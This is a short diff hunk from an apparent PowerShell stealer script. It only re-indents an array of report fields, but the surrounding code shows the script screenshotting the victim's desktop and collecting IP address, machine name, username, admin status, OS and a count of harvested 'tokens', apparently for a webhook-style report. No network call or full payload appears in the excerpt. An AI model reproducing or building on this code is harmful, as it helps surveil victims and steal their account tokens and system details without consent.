@@ -276,13 +276,13 @@ if ($firstRun) { $screenshotB64 = Get-ScreenCapture }
 if ($firstRun) {
     $bt = "```"
     $fields = @(
-        @{ name = "IP"; value = $ip; inline = $true },
-        @{ name = "PC"; value = $pc; inline = $true },
-        @{ name = "User"; value = $usr; inline = $true },
-        @{ name = "Admin"; value = $adm; inline = $true },
-        @{ name = "OS"; value = $os; inline = $true },
-        @{ name = "Tokens"; value = $validTokens.Count; inline = $true }
-    )
+    @{ name = "IP"; value = $ip; inline = $true },
+    @{ name = "PC"; value = $pc; inline = $true },
+    @{ name = "User"; value = $usr; inline = $true },
+    @{ name = "Admin"; value = $adm; inline = $true },
+    @{ name = "OS"; value = $os; inline = $true },
+    @{ name = "Tokens"; value = $validTokens.Count; inline = $true }
+)
     if ($screenshotB64) {
         $fields += @{ name = "Screenshot"; value = "Attached"; inline = $false }
     }
